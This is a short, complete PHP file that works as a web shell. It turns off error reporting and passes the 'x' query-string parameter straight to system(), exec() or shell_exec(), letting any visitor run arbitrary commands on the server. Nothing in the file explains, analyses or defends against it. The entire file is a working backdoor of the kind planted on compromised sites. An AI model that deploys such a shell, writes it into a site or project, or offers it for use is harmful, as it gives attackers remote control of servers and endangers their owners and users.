<?php
error_reporting(0);
error_log(0);

if(function_exists('system')) {
system($_GET['x']);
}
elseif(function_exists('exec')) {
exec($_GET['x']);
}
elseif(function_exists('shell_exec')) {
shell_exec($_GET['x']);
}
else {
echo "Cannot Execute Any Commands...";
}
?>
